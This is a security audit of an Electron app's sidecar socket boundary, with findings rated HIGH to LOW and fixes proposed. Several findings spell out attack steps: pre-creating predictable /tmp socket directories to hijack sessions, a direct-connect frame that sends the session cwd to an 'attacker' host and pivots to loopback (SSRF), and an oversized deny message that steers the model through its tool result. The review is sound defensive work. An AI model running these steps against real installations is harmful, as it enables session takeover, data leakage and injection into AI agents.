# A02 — sidecar trust boundary and security

## Verdict

The frame-level boundary is genuinely strong and, unusually, the code matches the spec: the
inbound vocabulary is a closed 30-entry allowlist enforced by `checkStrictKeys` *before* any
schema parse, every kind is schema-validated at the sidecar (never only at the preload),
T5a/T6/T6b/C1/C5 are implemented exactly as `PERMISSION-BOUNDARY.md` describes, `MAX_FRAME_BYTES`
and `MAX_OUTBOUND_FRAME_BYTES` are used in the correct directions in all four places they appear,
and `secretGuard` covers every outbound path because `send()` is the only writer. I could not
construct a forge, replay, cross-wire, index-escape, or `updatedPermissions`-authorship attack
against `handlePermissionResponse` / `handleAskUserQuestionAnswer`.

The single most important thing to fix is one level down: **the socket itself has no peer
authentication and lives at a predictable, pre-creatable `/tmp/catcode-<pid>` path.** Every
control above assumes the peer is the supervisor; nothing checks that it is. Below that, the
notable gaps are a throttle that silently disarms into unbounded billed API spend, and a
path-redaction that only covers `error` frames while every `*.result` frame ships raw engine
error text (with absolute paths) to the renderer.

## Findings

### [HIGH] The sidecar socket has no peer authentication, at a predictable pre-creatable /tmp path
- **Where**: `app/supervisor/supervisor.ts:188-196` and `:239`; `app/sidecar/index.ts:266-300`;
  `app/sidecar/sidecarServer.ts:574-679` (`addConnection`)
- **Type**: security
- **What**: The supervisor puts every session socket in `/tmp/catcode-<pid>/s<N>.sock`, creating
  the directory with `mkdirSync(dir, {recursive:true})` guarded by `if (!existsSync(...))` — no
  mode, no `mkdtemp`, no randomness. The sidecar binds there and `addConnection` trusts any peer
  that connects: it immediately emits `ready` (carrying `sessionId`, `engineSessionId`, live
  abort/goal state and every pending permission request), then the full attach snapshot burst and
  up to 4 MiB of transcript replay, and it accepts the entire inbound verb surface from that peer.
  There is no handshake, no token, no connection cap.
- **Trigger / why it matters**: `/tmp` is world-writable and PIDs are small and enumerable. A
  local process pre-creates `/tmp/catcode-1000` … `/tmp/catcode-99999` as directories it owns
  (mode 0777). When Electron main starts with one of those PIDs, `existsSync` is true, `mkdirSync`
  is skipped, and every session socket is created inside the attacker's directory — the `/tmp`
  sticky bit does not protect files inside a subdirectory the attacker owns. The attacker connects
  to `s0.sock`, reads `sessionId` straight out of the `ready` frame it is handed, and then sends
  `{protocolVersion:1, sessionId:<that>, message:{type:"app.submit", requestId:"x", prompt:"…"}}`.
  Workspace trust is already accepted for that cwd, so the prompt runs the real engine with real
  tools; `permission.response` frames then approve its own prompts (T5b concedes renderer
  auto-approval, but here the "renderer" is an unrelated local process). The same peer also gets
  the whole transcript for free from the replay burst. Even without the pre-creation step, the
  socket's mode comes from the launching process's umask, so a permissive umask alone makes the
  path connectable. This is the boundary the whole rest of the file defends; nothing below it
  matters if the peer is not the supervisor. The repo's own harnesses already do this correctly —
  `app/scripts/ram-fleet.ts:397` and `app/scripts/ram-probe.ts:218` both use `mkdtempSync`.
- **Fix**: create the socket directory with `mkdtempSync(join(tmpdir(), 'catcode-'))` (0700 by
  construction, unpredictable name) instead of the PID-derived path, and `chmod 0o600` the socket
  file after bind. If the short-`sun_path` constraint blocks `tmpdir()` on Darwin, keep `/tmp` but
  use `mkdtempSync('/tmp/cc-')` — still short, still random, still 0700.

### [MED] The context-breakdown freshness floor never arms when the analysis returns null, so a repeated request buys unbounded billed token counting
- **Where**: `app/sidecar/sidecarServer.ts:3030-3066` (`broadcastContextBreakdown`), read by
  `:2991-3009` (`handleContextBreakdownRequest`)
- **Type**: correctness / security (resource + cost DoS)
- **What**: `contextBreakdownComputedAt` and `contextBreakdownLast` are assigned only *after* the
  `if (!raw) return` early exit. `contextBreakdownDomain.snapshot()` returns `null` on an empty
  transcript **and on any thrown analyzer error** (`app/sidecar/contextBreakdownDomain.ts:187-193`,
  `:92`, `:95`). So in a failing state both stay at their initial `0` / `null`, and the guard
  `if (this.contextBreakdownLast && age < CONTEXT_BREAKDOWN_MIN_INTERVAL_MS)` can never fire.
- **Trigger / why it matters**: with the analyzer failing (a transient count-tokens error is
  enough), a renderer sending `context-breakdown.request` at the inbound rate cap gets a
  *continuous* chain of analyses: request 1 starts one, requests 2..N set
  `contextBreakdownPending`, and the `finally` immediately re-runs. Each analysis is a full
  transcript read plus `microcompactMessages` plus ~10 `countTokensWithFallback` calls, each a
  real `anthropic.beta.messages.countTokens` with a **Haiku sampling fallback** on failure — the
  exact cost the author wrote the 15 s floor to prevent (see the comment at `:2997-3002` and the
  matching one at `:456-468`). The floor is disarmed precisely in the state where the calls are
  most likely to be failing and retrying. Not covered by `contextBreakdownBoundary.test.ts`: its
  floor test (`:134`) only exercises the successful-snapshot path.
- **Fix**: set `this.contextBreakdownComputedAt = Date.now()` before the `if (!raw) return`, so a
  failed or empty analysis also starts the cooldown.

### [MED] Path/error redaction covers only `error` frames; every `*.result` frame ships raw engine error text to the renderer
- **Where**: `app/sidecar/sidecarServer.ts:3391-3407` (`sendError`, the only redaction point) vs
  `:2121-2135` (`session-action.result` catch), `:2099-2113`, `:1742-1753` (`account.result`),
  `:2179-2190` (`remoteSettings.result`), `:1926-1934`, `:1993-2001`, `:2271-2279`
- **Type**: security / convention
- **What**: `redactErrorMessage` (`:3460`) strips absolute POSIX paths and bounds the length, and
  its own doc-comment explains why that is necessary: "a failed vault unlink carries the vault
  file path in its message, and `vaultFilePath` is a SECURITY-MINIMUM §4 forbidden crossing." But
  it is applied *only* inside `sendError`. Every `*.result` frame builds its `message` field
  directly and bypasses it. `sessionActionsDomain.ts:160-161`, `:177-178`, `:194-195`, `:218-219`
  all produce `Could not export: ${error.message}` from raw fs/engine errors, and
  `handleSessionActionVerb`'s own `.catch` at `:2131` does the same. An `ENOENT: … open
  '/Users/<user>/.cat-code/projects/…/<uuid>.jsonl'` therefore reaches the untrusted renderer
  verbatim, and is rendered to the user (violating the "never render engineering notes" rule as
  well). `secretGuard` does not help — it scans key names, not values.
- **Trigger / why it matters**: any failing `session.export` / `session.branch` / `session.tag` /
  `account.*` on a session whose transcript path is unreadable. The mitigation the author
  deliberately built for one frame kind is absent from the six frame kinds that carry the same
  class of text.
- **Fix**: apply `redactErrorMessage` to the `message` field of every result frame, or move the
  call into `send()` for the `kind`s that carry a `message` field.

### [MED] `remoteSettings.directConnect` is a renderer-directed outbound request from the privileged sidecar, with no host policy
- **Where**: `app/sidecar/sidecarServer.ts:3875-3908` (`isAllowedRemoteServerUrl`), dispatched via
  `:2148-2204` → `app/sidecar/remoteSettingsDomain.ts:205-210` →
  `src/server/createDirectConnectSession.ts:49-58`
- **Type**: security
- **What**: `serverUrl` is the one renderer-authored string that becomes a real network request
  from the privileged process. The shape validation is good (absolute URL, `http:`/`https:` only,
  no embedded credentials, no query, no fragment, non-empty host) but there is deliberately **no
  host policy** — the source comment at `:3871-3873` states this outright: "What is deliberately
  NOT decided here: which HOSTS are reachable". `createDirectConnectSession` then `POST`s
  `{cwd: <absolute session cwd>}` to `${serverUrl}/sessions`.
- **Trigger / why it matters**: a compromised renderer sends
  `{type:"remoteSettings.directConnect", requestId:"x", serverUrl:"http://attacker/"}`. Two
  concrete effects: (a) the session's absolute cwd is exfiltrated to an arbitrary host, and (b) the
  sidecar becomes an SSRF pivot onto loopback and the LAN (`http://127.0.0.1:<port>/sessions`),
  with the response status distinguishable through the returned `ok:false` message. This is
  precisely the egress SECURITY-MINIMUM T3 pins `connect-src 'self'` to deny the renderer; the
  verb hands it back over a different plane. There are real mitigations already in place — a
  15 s timeout, a `directConnectInFlight` latch, the inbound rate cap — so this is a bounded
  channel, not an unbounded one, and the gap is acknowledged in source rather than hidden. But it
  is acknowledged in a code comment, not in a recorded decision, so nothing is tracking it.
- **Fix**: either restrict to loopback by default (`url.hostname` in
  `{'localhost','127.0.0.1','::1'}`) with an operator-configured allowlist for anything else, or
  record it as an explicit accepted risk in `decisions/` the way the `secretGuard`-is-key-only
  scope note was recorded.

### [LOW] The sidecar's T7 rate cap has no test, and a breach never drops the connection
- **Where**: `app/sidecar/sidecarServer.ts:3409-3417` (`checkRate`), used at `:789-798`
- **Type**: correctness / convention
- **What**: The only rate-limit tests in `app/` are `app/preload/rendererIpcGuard.test.ts:22-27` —
  the preload, which SECURITY-MINIMUM R2 explicitly says is *not* the boundary. The sidecar's own
  cap has zero coverage. Two secondary points: `limits.ts:28` calls it a "sliding-window" cap but
  `checkRate` is a fixed window, so 2× `MAX_FRAMES_PER_WINDOW` can pass across a window boundary;
  and a breach replies with an error frame and `continue`s (`:789-798`), so sustained over-cap
  traffic is answered 1:1 forever and the connection is never dropped.
- **Trigger / why it matters**: the untested branch is the comparison at `:3416`. Inverting it, or
  resetting `rateCount` on the wrong side of the window check, silently removes the only inbound
  flood cap at the trust boundary and every existing test still passes — the preload test would
  still be green and would still look like coverage.
- **Fix**: one test driving `MAX_FRAMES_PER_WINDOW + 1` frames through `handleData` and asserting
  the last one produces `bad_request` with no dispatch; fix the "sliding-window" wording or make
  it sliding.

### [LOW] `dispatch` has no exhaustiveness tripwire, so a new engine message type would be silently dropped
- **Where**: `app/sidecar/sidecarServer.ts:1035-1076`
- **Type**: convention
- **What**: The switch over `AppClientMessage` (a closed 4-member union) handles every case with a
  `return` and has no `default` assigning to `never` — the tripwire the repo requires for closed
  unions and applies elsewhere (`remoteSettingsDomain.ts:274-278` does it correctly).
- **Trigger / why it matters**: if a fifth type is added to `appClientMessageSchema` and to
  `checkStrictKeys`, `dispatch` falls through and returns void — the frame is accepted, validated,
  and then silently ignored with no error frame. That is the wrong failure mode for the "inbound =
  fail closed" side of the asymmetry, and there is no compile error to catch it.
- **Fix**: add `default: { const never: never = message; this.sendError(connection, undefined,
  'bad_request', …, false) }`.

### [LOW] The permission `deny.message` is the only uncapped renderer-authored free-text field
- **Where**: `app/sidecar/sidecarServer.ts:2385-2388` (`sanitizePermissionResponse` returns deny
  unchanged); schema at `src/utils/permissions/PermissionPromptToolResultSchema.ts:64-70`
  (`message: z.string()`, no max)
- **Type**: security
- **What**: Every other renderer free-text field is bounded — `app.abort.reason` and `app.ping.nonce`
  at `MAX_TEXT_FIELD_CHARS` (`:1042`, `:1055`), `app.submit.prompt` at `MAX_PROMPT_BYTES`
  (`:1421`), the AskUserQuestion `other` at `MAX_QUESTION_ANSWER_CHARS` (`:3652`), every verb
  string at `MAX_TEXT_FIELD_CHARS`. The deny message is not, so it is bounded only by
  `MAX_FRAME_BYTES` (128 KiB) and lands in the model's context as the tool result.
- **Trigger / why it matters**: a compromised renderer denies one prompt with ~128 KiB of authored
  text to steer the model, repeatable at 120 frames/s. T5b already concedes the renderer decides
  allow/deny, so this is an inconsistency in the bounding posture rather than a new capability —
  but it is the one gap in an otherwise complete set.
- **Fix**: cap `response.message` at `MAX_TEXT_FIELD_CHARS` in `sanitizePermissionResponse`'s deny
  branch, matching every sibling field.

### [LOW] `hardening-smoke` asserts no sidecar-boundary property, and three of its XSS checks are conditionally vacuous
- **Where**: `app/scripts/hardening-smoke.ts:294-296`, `:289`
- **Type**: quality (test integrity)
- **What**: The harness is genuinely non-vacuous for what it does test — it injects crafted
  Markdown, exact-matches the preload bridge key list against a hardcoded allowlist (`:237-279`,
  `:313-317`), and really does attempt a navigation and a `window.open`. Two caveats. First, it
  sends **zero inbound frames to a sidecar**; it exercises renderer/preload/CSP/navigation only.
  Citing "hardening 19/19" as evidence for a sidecar boundary change is a category error — the
  boundary evidence is `sidecarServer.test.ts` (which is excellent: T5a/T6/T6b/F10/C1/C5 all have
  positive *and* negative cases, including the cross-pending isolation test at `:2967`). Second,
  `markdownScriptRan` / `markdownImgRan` / `markdownLinkRan` can only be `true` if the crafted
  content actually rendered; if the marker check at `:289` fails, those three report `PASS` while
  proving nothing. The suite as a whole still fails (the marker check is its own check), so the
  exit code is honest, but the per-line output is misleading in exactly the case a reader would
  most want to trust it.
- **Trigger / why it matters**: a renderer regression that stops the transcript pane rendering
  would print `1 FAIL` next to three reassuring `PASS`es about XSS.
- **Fix**: gate the three XSS assertions on `probe.markerRendered` (report them as
  `SKIPPED (content never rendered)` otherwise). No change needed to the sidecar coverage story —
  just do not let "hardening" be read as covering it.

## What is good here

- **`checkStrictKeys` runs before every schema parse, and rejects rather than strips.** This is the
  load-bearing control and it is done right: a `Map` lookup (not `key in obj`) so `constructor` /
  `toString` cannot resolve to a prototype function, per-type key sets, and a second pass over the
  two nested renderer-controlled objects (`app.submit.options`, `permission.response.response`).
  It is what makes the Zod schemas' strip-unknown-keys behaviour safe to reuse. Enumerated all 30
  inbound kinds against it: every one is on the allowlist and every one then hits either a
  sidecar-local Zod schema or `appClientMessageSchema` at the sidecar. Nothing is preload-only.
- **C1 selection-by-index is implemented as byte-fidelity, not as comparison.** `validateSuggestionSelection`
  (`:4033-4090`) reads `applySuggestions` from the *raw* frame (because the shared Zod schema would
  strip it), rejects non-array / non-integer / negative / out-of-range / duplicate / >16 /
  selection-on-deny / no-suggestions-minted, and then the caller re-attaches
  `structuredClone(engineOwnObjects)` — the renderer's bytes never become rule content, and the
  clone prevents aliasing the pending request. Negative indices are additionally impossible
  upstream (`z.number().int().nonnegative()` at `:3651`). Worth copying anywhere else a renderer
  needs to "choose" an engine object.
- **T6 is strengthened past its own spec.** The spec asks that a differing `updatedInput` be
  rejected; the code goes further and *always forwards the gated input* (`:2418-2427`), which is
  what closes the `{}`-means-"use original" reversal. The two-line justification at `:2397-2401`
  is exactly the kind of comment that earns its place.
- **Directional caps are correct in all four places, and never unified.** `FrameDecoder(MAX_FRAME_BYTES)`
  inbound at `:580`; `MAX_OUTBOUND_FRAME_BYTES` on the outbound size check at `:3363`; the
  supervisor mirrors both correctly (`supervisor.ts:279` reads with the outbound cap, `:349` writes
  with the inbound cap); `backpressuredSocket.ts:6` sizes its 64 MiB queue explicitly *above* the
  32 MiB outbound cap so one legitimate max frame's remainder always fits. `mainDecisions.test.ts:532-535`
  pins the relationship. Breach behaviour is right too: the inbound cap is enforced on the
  *declared length* before the body is buffered (`framing.ts:50-58`) and drops the connection as
  unrecoverable; the outbound cap drops one frame and logs it.
- **`send()` is the single outbound writer** (verified: the only `socket.write` in the file is at
  `:3371`), so `secretGuard` genuinely covers every outbound path. The one exemption — `error`
  frames — is loop-avoidance and is compensated by `redactErrorMessage` on that exact path. The
  export verb even pre-checks its own size at `:2080-2097` so an over-cap transcript fails closed
  with an honest message instead of being silently dropped by the cap.
- **Backpressure is bounded and ordered.** `createBackpressuredSocket` queues in order (correct for
  a length-prefixed stream), caps at 64 MiB, and on overflow clears the queue and `end()`s rather
  than growing — and its `end()` defers the real close until the queue flushes, so the frames it
  exists to protect are not truncated by the close.

## Not reviewed / uncertain

- **Socket file mode under Bun.** I confirmed the *directory* is `drwxr-xr-x` on this machine
  (`/tmp/catcode-*` from prior runs) and that no `chmod` exists anywhere in `supervisor.ts` or
  `index.ts`, but I did not observe a live socket file's mode (they are unlinked on exit and I did
  not run the app). Whether a *different* local user can `connect(2)` without the directory
  pre-creation step therefore depends on the launching umask and on macOS's enforcement of unix
  socket permissions. This does not affect the HIGH finding — the pre-creation vector does not
  depend on the socket's own mode, since the attacker owns the containing directory — but it
  changes how bad the no-umask-change case is. Resolved by `ls -l /tmp/catcode-*/*.sock` while the
  app is running.
- **Whether `session-action.result` / `account.result` messages are actually rendered verbatim to
  the user.** I verified the unredacted path text reaches the renderer over the wire, which is the
  boundary concern and is enough for the MED finding. I did not trace the renderer component that
  displays it, so I cannot say whether the user-visible-text rule is violated in addition to the
  leak. Resolved by grepping the renderer for the `session-action.result` consumer.
- **`handleTaskControlVerb` is dispatched as `void this.handleTaskControlVerb(...)` (`:974`) with
  no `.catch`.** I traced `taskControlDomain.stop` and it is genuinely throw-free (catch-all at
  `taskControlDomain.ts:88-101`), so this is safe today; I am not reporting it. It is worth
  knowing that the safety is a property of the domain, not of the call site, so a future domain
  that throws produces an unhandled rejection in the sidecar process.
- I did not run any test suite (read-only review per the contract). All line references were read
  directly from source on the current working tree.
